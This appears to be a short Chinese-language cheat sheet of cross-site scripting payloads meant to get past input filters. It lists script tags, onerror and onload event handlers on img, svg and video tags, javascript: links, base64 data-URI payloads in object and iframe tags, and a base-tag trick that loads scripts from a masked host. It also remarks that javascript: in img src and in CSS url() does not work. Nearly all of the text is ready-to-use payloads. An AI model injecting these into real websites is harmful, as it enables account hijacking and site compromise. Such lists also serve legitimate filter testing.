```
1.<script>标签都可以啦

2.<img src=1 onerror=alert(1)> 类似于这样的on**的都可以 还有一些不太常用的标签可能会绕过过滤
<anchor onload= <svg onload= <video>等等 还有很多 可能不会过滤的那么全面

3.<a href=javascript:alert(19)>M 蛋疼的需要点击

4.<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></object> 
<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></iframe>

5.<base>标签的妙用
<base href=http://*.*.*.*>
<script src="file/public.js" type="text/javascript"></script>

6.在此说明一下很多网上文章上写的类似于 <img src=javascript:alert(1)> 都是错误的 只要有src=javascript:alert(1)统统不行啊！！！
所以这里就引出了css当中 css当中很多都类似于这样的
<style> body { background:url('javascript:alert(1))')}</style>
和上面一样 也不行 所以说css 并没有什么卵用(可能是我太菜了，，，)

```
